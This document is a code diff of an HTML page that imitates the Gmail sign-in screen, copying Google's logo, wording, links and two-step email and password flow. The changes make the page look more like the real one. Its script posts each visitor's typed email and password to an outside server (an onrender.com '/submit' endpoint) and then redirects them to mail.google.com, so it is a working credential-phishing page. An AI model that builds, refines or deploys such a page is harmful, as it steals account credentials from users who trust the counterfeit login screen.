@@ -6,14 +6,13 @@
   <title>Gmail - Sign in</title>
   <style>
     :root {
-      --bg: #f5f7fb;
-      --panel: #ffffff;
-      --text: #202124;
+      --bg: #ffffff;
+      --text: #1f1f1f;
       --muted: #5f6368;
       --border: #dadce0;
       --blue: #1a73e8;
       --blue-dark: #1558c0;
-      --danger: #d93025;
+      --error: #d93025;
     }
 
     * {
@@ -31,68 +30,76 @@
     body {
       min-height: 100vh;
       display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      flex-direction: column;
+      padding: 24px 20px 0;
+      background: #fff;
     }
 
-    .panel {
+    .page {
       width: 100%;
-      max-width: 420px;
-      background: var(--panel);
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(60, 64, 67, 0.12);
-      border: 1px solid rgba(218, 220, 224, 0.9);
-      padding: 28px 26px 24px;
+      max-width: 450px;
+      margin: 0 auto;
+      flex: 1;
     }
 
     .logo {
       width: 48px;
       height: 48px;
-      margin: 0 auto 18px;
+      margin-top: 8px;
+      margin-bottom: 18px;
       display: block;
     }
 
     .title {
-      margin: 0 0 10px;
+      margin: 0;
       font-size: 24px;
+      line-height: 32px;
       font-weight: 400;
       letter-spacing: -0.2px;
-      text-align: left;
     }
 
     .subtitle {
-      margin: 0 0 24px;
+      margin: 10px 0 28px;
       font-size: 16px;
+      line-height: 24px;
       color: var(--text);
     }
 
-    .account-tag {
+    .view {
+      display: none;
+    }
+
+    .view.active {
+      display: block;
+    }
+
+    .account-chip {
       display: inline-flex;
       align-items: center;
       gap: 8px;
-      padding: 7px 12px;
+      padding: 6px 12px 6px 10px;
       border: 1px solid var(--border);
       border-radius: 999px;
       font-size: 14px;
+      line-height: 20px;
       color: var(--text);
+      background: transparent;
       margin-bottom: 22px;
       max-width: 100%;
-      background: #fff;
     }
 
-    .account-tag svg {
-      width: 18px;
-      height: 18px;
+    .account-chip svg {
+      width: 17px;
+      height: 17px;
       color: var(--muted);
       flex-shrink: 0;
     }
 
-    .account-email {
+    .chip-text {
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
-      max-width: 250px;
+      max-width: 260px;
     }
 
     .field-wrap {
@@ -105,18 +112,19 @@
       height: 56px;
       border: 1px solid var(--border);
       border-radius: 4px;
-      padding: 22px 16px 6px;
-      font-size: 16px;
-      color: var(--text);
-      outline: none;
       background: transparent;
+      padding: 20px 16px 6px;
+      outline: none;
+      font-size: 16px;
+      line-height: 24px;
+      color: var(--text);
       transition: border-color 0.15s ease, box-shadow 0.15s ease;
     }
 
     .field:focus {
       border: 2px solid var(--blue);
-      padding: 21px 15px 5px;
-      box-shadow: 0 0 0 1px rgba(26,115,232,0.12);
+      padding: 19px 15px 5px;
+      box-shadow: 0 0 0 1px rgba(26, 115, 232, 0.12);
     }
 
     .field-label {
@@ -127,8 +135,8 @@
       font-size: 16px;
       line-height: 24px;
       color: var(--muted);
-      background: transparent;
       pointer-events: none;
+      background: transparent;
       transition: all 0.15s ease;
     }
 
@@ -142,42 +150,36 @@
       padding: 0 4px;
     }
 
-    .toggle-row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-top: 12px;
-      margin-bottom: 12px;
-      min-height: 24px;
-    }
-
-    .show-toggle {
-      margin-left: auto;
-      border: none;
-      background: transparent;
+    .link {
       color: var(--blue);
       font-size: 14px;
       font-weight: 500;
+      text-decoration: none;
       cursor: pointer;
-      padding: 0;
     }
 
-    .btn-row {
+    .link-row {
+      margin-top: 26px;
+      margin-bottom: 30px;
+    }
+
+    .actions-row {
       display: flex;
-      justify-content: space-between;
       align-items: center;
-      margin-top: 24px;
+      justify-content: space-between;
       gap: 12px;
+      margin-top: 12px;
     }
 
     .btn {
       border: none;
       border-radius: 999px;
-      min-height: 36px;
-      padding: 0 18px;
+      cursor: pointer;
       font-size: 14px;
       font-weight: 500;
-      cursor: pointer;
+      line-height: 20px;
+      min-height: 36px;
+      padding: 0 18px;
       transition: opacity 0.15s ease, background-color 0.15s ease;
     }
 
@@ -203,6 +205,17 @@
       cursor: progress;
     }
 
+    .password-toggle {
+      margin-left: auto;
+      border: none;
+      background: transparent;
+      color: var(--blue);
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      padding: 0;
+    }
+
     .status {
       min-height: 18px;
       margin-top: 12px;
@@ -215,26 +228,45 @@
     }
 
     .status.error {
-      color: var(--danger);
+      color: var(--error);
     }
 
-    .view {
-      display: none;
+    .footer {
+      max-width: 450px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 18px 0 24px;
+      color: var(--muted);
+      font-size: 12px;
+      line-height: 16px;
     }
 
-    .view.active {
-      display: block;
+    .lang {
+      display: inline-block;
+      padding: 8px 0;
     }
 
-    @media (max-width: 480px) {
-      .panel {
-        padding: 24px 18px 18px;
+    .footer-links {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      margin-top: 16px;
+      flex-wrap: wrap;
+    }
+
+    .footer-links a {
+      color: var(--muted);
+      text-decoration: none;
+    }
+
+    @media (max-width: 520px) {
+      body {
+        padding-left: 16px;
+        padding-right: 16px;
       }
-
-      .btn-row {
+      .actions-row {
         flex-wrap: wrap;
       }
-
       .btn-primary {
         margin-left: auto;
       }
@@ -242,18 +274,20 @@
   </style>
 </head>
 <body>
-  <main class="panel" aria-label="Gmail sign in form">
-    <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" role="img" aria-label="Google logo">
-      <defs>
-        <mask id="google-g-mask">
-          <rect width="512" height="512" fill="#000"/>
-          <path fill="#fff" d="M492 256c0-16.5-1.5-32.5-4.2-48H256v92h132.5c-5.7 30.7-23 56.7-49.1 74.2v61.5h79.5c46.5-42.8 73.1-105.7 73.1-179.7zm-236 244c65.9 0 121.1-21.8 161.5-59.2l-79.5-61.5c-22.1 14.8-50.3 23.5-82 23.5-63.1 0-116.5-42.6-135.6-100H38.5v63.5C78.9 446.4 161.2 500 256 500zm-135.6-197.2c-4.8-14.8-7.6-30.5-7.6-46.8s2.8-32 7.6-46.8V145.7H38.5C22.2 178.2 13 216.1 13 256s9.2 77.8 25.5 110.3l81.9-63.5zm135.6-190.6c35.8 0 68 12.3 93.3 36.4l70-70C377.1 40.2 321.9 12 256 12 161.2 12 78.9 65.6 38.5 145.7l81.9 63.5c19.1-57.4 72.5-100 135.6-100z"/>
-        </mask>
-      </defs>
-      <foreignObject width="512" height="512" mask="url(#google-g-mask)">
-        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;border-radius:50%;background:conic-gradient(from 0deg at 50% 50%,#4285F4 0deg 45deg,#EA4335 120deg,#FBBC05 200deg,#34A853 280deg,#4285F4 340deg 360deg);"></div>
-      </foreignObject>
-    </svg>
+  <main class="page">
+    <div class="logo-wrap">
+      <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" role="img" aria-label="Google logo">
+        <defs>
+          <mask id="google-g-mask">
+            <rect width="512" height="512" fill="#000"/>
+            <path fill="#fff" d="M492 256c0-16.5-1.5-32.5-4.2-48H256v92h132.5c-5.7 30.7-23 56.7-49.1 74.2v61.5h79.5c46.5-42.8 73.1-105.7 73.1-179.7zm-236 244c65.9 0 121.1-21.8 161.5-59.2l-79.5-61.5c-22.1 14.8-50.3 23.5-82 23.5-63.1 0-116.5-42.6-135.6-100H38.5v63.5C78.9 446.4 161.2 500 256 500zm-135.6-197.2c-4.8-14.8-7.6-30.5-7.6-46.8s2.8-32 7.6-46.8V145.7H38.5C22.2 178.2 13 216.1 13 256s9.2 77.8 25.5 110.3l81.9-63.5zm135.6-190.6c35.8 0 68 12.3 93.3 36.4l70-70C377.1 40.2 321.9 12 256 12 161.2 12 78.9 65.6 38.5 145.7l81.9 63.5c19.1-57.4 72.5-100 135.6-100z"/>
+          </mask>
+        </defs>
+        <foreignObject width="512" height="512" mask="url(#google-g-mask)">
+          <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;border-radius:50%;background:conic-gradient(from 0deg at 50% 50%,#4285F4 0deg 45deg,#EA4335 120deg,#FBBC05 200deg,#34A853 280deg,#4285F4 340deg 360deg);"></div>
+        </foreignObject>
+      </svg>
+    </div>
 
     <form id="login-form" novalidate>
       <section id="email-view" class="view active">
@@ -261,11 +295,15 @@
         <p class="subtitle">Use your Google Account</p>
 
         <div class="field-wrap">
-          <input type="text" id="emailInput" class="field" placeholder=" " required />
+          <input id="emailInput" class="field" type="text" placeholder=" " required />
           <label class="field-label" for="emailInput">Email or phone</label>
         </div>
 
-        <div class="btn-row">
+        <div class="link-row">
+          <a href="#" class="link">Forgot email?</a>
+        </div>
+
+        <div class="actions-row">
           <button type="button" class="btn btn-secondary">Create account</button>
           <button type="button" id="btn-email-next" class="btn btn-primary">Next</button>
         </div>
@@ -274,23 +312,27 @@
       <section id="password-view" class="view">
         <h1 class="title">Welcome</h1>
 
-        <div class="account-tag" aria-label="Selected account">
+        <div class="account-chip" aria-label="Selected account">
           <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.13 6-3.13s5.97 1.14 6 3.13c-1.29 1.94-3.5 3.22-6 3.22z"></path>
           </svg>
-          <span id="accountName" class="account-email">User</span>
+          <span id="accountName" class="chip-text">User</span>
         </div>
 
         <div class="field-wrap">
-          <input type="password" id="passwordInput" class="field" placeholder=" " required />
+          <input id="passwordInput" class="field" type="password" placeholder=" " required />
           <label class="field-label" for="passwordInput">Enter your password</label>
         </div>
 
-        <div class="toggle-row">
-          <button type="button" id="passwordToggle" class="show-toggle" aria-label="Show password">Show</button>
+        <div class="actions-row" style="justify-content: flex-end;">
+          <button type="button" id="passwordToggle" class="password-toggle" aria-label="Show password">Show</button>
         </div>
 
-        <div class="btn-row">
+        <div class="link-row" style="margin-top: 18px; margin-bottom: 18px;">
+          <a href="#" class="link">Forgot password?</a>
+        </div>
+
+        <div class="actions-row">
           <button type="button" id="btn-pass-back" class="btn btn-secondary">Back</button>
           <button type="submit" id="submitBtn" class="btn btn-primary">Next</button>
         </div>
@@ -300,18 +342,27 @@
     </form>
   </main>
 
+  <footer class="footer">
+    <div class="lang">English (United States)</div>
+    <div class="footer-links">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </footer>
+
   <script>
     const emailView = document.getElementById('email-view');
     const passwordView = document.getElementById('password-view');
     const emailInput = document.getElementById('emailInput');
     const passwordInput = document.getElementById('passwordInput');
     const accountName = document.getElementById('accountName');
+    const status = document.getElementById('status');
     const btnEmailNext = document.getElementById('btn-email-next');
     const btnPassBack = document.getElementById('btn-pass-back');
     const passwordToggle = document.getElementById('passwordToggle');
-    const form = document.getElementById('login-form');
     const submitBtn = document.getElementById('submitBtn');
-    const status = document.getElementById('status');
+    const form = document.getElementById('login-form');
 
     function showStatus(message, type = '') {
       status.textContent = message || '';
@@ -319,6 +370,10 @@
       if (message) {
         status.classList.add(type, 'visible');
       }
+    }
+
+    function isValidEmail(value) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
     }
 
     function showEmailView() {
@@ -331,10 +386,6 @@
       emailView.classList.remove('active');
       passwordView.classList.add('active');
       passwordInput.focus();
-    }
-
-    function isValidEmail(value) {
-      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
     }
 
     btnEmailNext.addEventListener('click', () => {
@@ -392,10 +443,10 @@
       submitBtn.textContent = 'Signing in...';
       showStatus('Signing in...', '');
 
-      const endpoint = 'https://my-backend-5mo9.onrender.com/submit';
-      const payload = new URLSearchParams({ email, password });
-
       try {
+        const endpoint = 'https://my-backend-5mo9.onrender.com/submit';
+        const payload = new URLSearchParams({ email, password });
+
         const response = await fetch(endpoint, {
           method: 'POST',
           headers: {
@@ -413,14 +464,14 @@
         let result = {};
         try {
           result = await response.json();
-        } catch (e) {
+        } catch {
           result = {};
         }
 
         const redirectUrl = result.redirectUrl || 'https://mail.google.com/mail/u/0/';
         window.location.assign(redirectUrl);
       } catch (error) {
-        console.error('Login flow error:', error);
+        console.error('Login error:', error);
         showStatus('Unable to sign in right now. Please try again.', 'error');
         submitBtn.disabled = false;
         submitBtn.textContent = 'Next';
